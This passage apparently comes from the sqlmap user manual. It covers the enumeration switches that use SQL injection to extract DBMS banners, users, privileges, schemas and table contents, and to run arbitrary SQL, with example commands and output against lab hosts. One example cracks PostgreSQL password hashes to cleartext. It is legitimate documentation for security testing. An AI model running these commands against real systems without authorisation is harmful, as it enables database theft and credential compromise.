## Enumeration

These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements. 

### Retrieve all

Switch: `--all`

This switch can be used in situations where user wants to retrieve everything remotely accessible by using a single switch. This is not recommended as it will generate large number of requests retrieving both useful and unuseful data.

### Banner

Switch: `-b` or `--banner`

Most of the modern database management systems have a function and/or  an environment variable which returns the database management system version and eventually details on its patch level, the underlying system. Usually the function is `version()` and the environment variable is `@@version`, but this vary depending on the target DBMS. 

Example against an Oracle target:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int.php?id=1" -\
-banner

[...]
[xx:xx:11] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: Oracle
banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'
```

### Session user

Switch: `--current-user`

With this switch it is possible to retrieve the database management system's user which is effectively performing the query against the back-end DBMS from the web application. 

### Current database

Switch: `--current-db`

With this switch it is possible to retrieve the database management system's database name that the web application is connected to.

### Server hostname

Switch: `--hostname`

With this switch it is possible to retrieve the database management system's hostname.

Example against a MySQL target:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --\
hostname

[...]
[xx:xx:04] [INFO] fetching server hostname
[xx:xx:04] [INFO] retrieved: debian-5.0-i386
hostname:    'debian-5.0-i386'
```

### Detect whether or not the session user is a database administrator

Switch: `--is-dba`

It is possible to detect if the current database management system session user is a database administrator, also known as DBA. sqlmap will return `True` if it is, vice versa `False`. 

### List database management system users

Switch: `--users`

When the session user has read access to the system table containing information about the DBMS users, it is possible to enumerate the list of users. 

### List and crack database management system users password hashes

Switch: `--passwords`

When the session user has read access to the system table containing information about the DBMS users' passwords, it is possible to enumerate the password hashes for each database management system user. sqlmap will first enumerate the users, then the different password hashes for each of them. 

Example against a PostgreSQL target:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
passwords -v 1

[...]
back-end DBMS: PostgreSQL
[hh:mm:38] [INFO] fetching database users password hashes
do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
[hh:mm:42] [INFO] using hash method: 'postgres_passwd'
what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt] 
[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
do you want to use common password suffixes? (slow!) [y/N] n
[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
database management system users password hashes:
[*] postgres [1]:
    password hash: md5d7d880f96044b72d0bba108ace96d1e4
    clear-text password: testpass
[*] testuser [1]:
    password hash: md599e5ea7a6f7c3269995cba3927fd0093
    clear-text password: testpass
```

Not only sqlmap enumerated the DBMS users and their passwords, but it also recognized the hash format to be PostgreSQL, asked the user whether or not to test the hashes against a dictionary file and identified the clear-text password for the `postgres` user, which is usually a DBA along the other user, `testuser`, password. 

This feature has been implemented for all DBMS where it is possible to enumerate users' password hashes, including Oracle and Microsoft SQL Server pre and post 2005. 

You can also provide the option `-U` to specify the specific user who you want to enumerate and eventually crack the password hash(es). If you provide `CU` as username it will consider it as an alias for current user and will retrieve the password hash(es) for this user. 

### List database management system users privileges

Switch: `--privileges`

When the session user has read access to the system table containing information about the DBMS users, it is possible to enumerate the privileges for each database management system user. By the privileges, sqlmap will also show you which are database administrators.

You can also provide the option `-U` to specify the user who you want to enumerate the privileges.

If you provide `CU` as username it will consider it as an alias for current user and will enumerate the privileges for this user. 

On Microsoft SQL Server, this feature will display you whether or not each user is a database administrator rather than the list of privileges for all users.

### List database management system users roles

Switch: `--roles`

When the session user has read access to the system table containing information about the DBMS users, it is possible to enumerate the roles for each database management system user.

You can also provide the option `-U` to specify the user who you want to enumerate the privileges.

If you provide `CU` as username it will consider it as an alias for current user and will enumerate the privileges for this user.

This feature is only available when the DBMS is Oracle.

### List database management system's databases

Switch: `--dbs`

When the session user has read access to the system table containing information about available databases, it is possible to enumerate the list of databases. 

### Enumerate database's tables

Switches and option: `--tables`, `--exclude-sysdbs` and `-D`

When the session user has read access to the system table containing information about databases' tables, it is possible to enumerate the list of tables for a specific database management system's databases.

If you do not provide a specific database with option `-D`, sqlmap will enumerate the tables for all DBMS databases.

You can also provide the switch `--exclude-sysdbs` to exclude all system databases.

Note that on Oracle you have to provide the `TABLESPACE_NAME` instead of the database name.

### Enumerate database table columns

Switch and options: `--columns`, `-C`, `-T` and `-D`

When the session user has read access to the system table containing information about database's tables, it is possible to enumerate the list of columns for a specific database table. sqlmap also enumerates the data-type for each column. 

This feature depends on option `-T` to specify the table name and optionally on `-D` to specify the database name. When the database name is not specified, the current database name is used. You can also provide the `-C` option to specify the table columns name like the one you provided to be enumerated.

Example against a SQLite target:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" -\
-columns -D testdb -T users -C name
[...]
Database: SQLite_masterdb
Table: users
[3 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| id      | INTEGER |
| name    | TEXT    |
| surname | TEXT    |
+---------+---------+
```

Note that on PostgreSQL you have to provide `public` or the name of a system database. That's because it is not possible to enumerate  other databases tables, only the tables under the schema that the web application's user is connected to, which is always aliased by `public`. 

### Enumerate database management system schema

Switches: `--schema` and `--exclude-sysdbs`

User can retrieve a DBMS schema by using this switch. Schema listing will contain all databases, tables and columns, together with their respective types. In combination with `--exclude-sysdbs` only part of the schema containing non-system databases will be retrieved and shown.

Example against a MySQL target:

```
$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --s\
chema--batch --exclude-sysdbs

[...]
Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+

Database: owasp10
Table: blogs_table
[4 columns]
+--------------+----------+
| Column       | Type     |
+--------------+----------+
| date         | datetime |
| blogger_name | text     |
| cid          | int(11)  |
| comment      | text     |
+--------------+----------+

Database: owasp10
Table: hitlog
[6 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| date     | datetime |
| browser  | text     |
| cid      | int(11)  |
| hostname | text     |
| ip       | text     |
| referer  | text     |
+----------+----------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
[...]
```

### Retrieve number of entries for table(s)

Switch: `--count`

In case that user wants just to know the number of entries in table(s) prior to dumping the desired one, he can use this switch.

Example against a Microsoft SQL Server target:

```
$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"\
 --count -D testdb
[...]
Database: testdb
+----------------+---------+
| Table          | Entries |
+----------------+---------+
| dbo.users      | 4       |
| dbo.users_blob | 2       |
+----------------+---------+
```

### Dump database table entries

Switch and options: `--dump`, `-C`, `-T`, `-D`, `--start`, `--stop`, `--first`, `--last`, `--pivot-column` and `--where`

When the session user has read access to a specific database's table it is possible to dump the table entries.

This functionality depends on option `-T` to specify the table name and optionally on option `-D` to specify the database name. If the table name is provided, but the database name is not, the current database name is used.

Example against a Firebird target:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1"\
 --dump -T users
[...]
Database: Firebird_masterdb
Table: USERS
[4 entries]
+----+--------+------------+
| ID | NAME   | SURNAME    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
```

This switch can also be used to dump all tables' entries of a provided database. You simply have to provide sqlmap with the switch `--dump` along with only the option `-D` (no `-T` and no `-C`).

You can also provide a comma-separated list of the specific columns to dump with the option `-C`.

sqlmap also generates for each table dumped the entries in a CSV format textual file. You can see the absolute path where sqlmap creates the file by providing a verbosity level greater than or equal to **1**.

If you want to dump only a range of entries, then you can provide options `--start` and/or `--stop` to respectively start to dump from a certain entry and stop the dump at a certain entry. For instance, if you want to dump only the first entry, provide `--stop 1` in your command line. Vice versa if, for instance, you want to dump only the second and third entry, provide `--start 1` `--stop 3`.

It is also possible to specify which single character or range of characters to dump with options `--first` and `--last`. For instance, if you want to dump columns' entries from the third to the fifth character, provide `--first 3` `--last 5`. This feature only applies to the blind SQL injection techniques because for error-based and UNION query SQL injection techniques the number of requests is exactly the same, regardless of the length of the column's entry output to dump.

Sometimes (e.g. for Microsoft SQL Server, Sybase and SAP MaxDB) it is not possible to dump the table rows straightforward by using `OFFSET m, n` mechanism because of lack of similar. In such cases sqlmap dumps the content by determining the most suitable `pivot` column (the one with most unique values) whose values are used later on for retrieval of other column values. If it is necessary to enforce the usage of particular `pivot` column because the automatically chosen one is not suitable (e.g. because of lack of table dump results) you can use option `--pivot-column` (e.g. `--pivot-column=id`).

In case that you want to constraint the dump to specific column values (or ranges) you can use option `--where`. Provided logical operation will be automatically used inside the `WHERE` clause. For example, if you use `--where="id>3"` only table rows having value of column `id` greater than 3 will be retrieved (by appending `WHERE id>3` to used dumping queries).

As you may have noticed by now, sqlmap is **flexible**: you can leave it to automatically dump the whole database table or you can be very precise in which characters to dump, from which columns and which range of entries.

### Dump all databases tables entries

Switches: `--dump-all` and `--exclude-sysdbs`

It is possible to dump all databases tables entries at once that the session user has read access on.

You can also provide the switch `--exclude-sysdbs` to exclude all system databases. In that case sqlmap will only dump entries of users' databases tables.

Note that on Microsoft SQL Server the `master` database is not considered a system database because some database administrators use it as a users' database.

### Search for columns, tables or databases

Switch and options: `--search`, `-C`, `-T`, `-D`

This switch allows you to **search for specific database names, specific tables across all databases or specific columns across all databases' tables**. 

This is useful, for instance, to identify tables containing custom application credentials where relevant columns' names contain string like _name_ and _pass_.

Switch `--search` needs to be used in conjunction with one of the following support options:

* `-C` following a list of comma-separated column names to look for across the whole database management system.
* `-T` following a list of comma-separated table names to look for across the whole database management system.
* `-D` following a list of comma-separated database names to look for across the database management system.

### Run custom SQL statement

Option and switch: `--sql-query` and `--sql-shell`

The SQL query and the SQL shell features allow to run arbitrary SQL statements on the database management system. sqlmap automatically dissects the provided statement, determines which technique is appropriate to use to inject it and how to pack the SQL payload accordingly. 

If the query is a `SELECT` statement, sqlmap will retrieve its output. Otherwise it will execute the query through the stacked query SQL injection technique if the web application supports multiple statements on the back-end database management system. Beware that some web application technologies do not support stacked queries on specific database management systems. For instance, PHP does not support stacked queries when the back-end DBMS is MySQL, but it does support when the back-end DBMS is PostgreSQL.

Examples against a Microsoft SQL Server 2000 target:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --\
sql-query "SELECT 'foo'" -v 1

[...]
[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
[hh:mm:14] [INFO] retrieved: foo
SELECT 'foo':    'foo'

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --\
sql-query "SELECT 'foo', 'bar'" -v 2

[...]
[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now 
unpack it into distinct queries to be able to retrieve the output even if we are
 going blind
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS 
VARCHAR(8000)), (CHAR(32)))
[hh:mm:50] [INFO] retrieved: foo
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA
RCHAR(8000)), (CHAR(32)))
[hh:mm:50] [INFO] retrieved: bar
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
SELECT 'foo', 'bar':    'foo, bar'
```

As you can see, sqlmap splits the provided query into two different `SELECT` statements then retrieves the output for each separate query. 

If the provided query is a `SELECT` statement and contains a `FROM` clause, sqlmap will ask you if such statement can return multiple entries. In that case the tool knows how to unpack the query correctly to count the number of possible entries and retrieve its output, entry per entry. 

The SQL shell option allows you to run your own SQL statement interactively, like a SQL console connected to the database management system. This feature provides TAB completion and history support too. 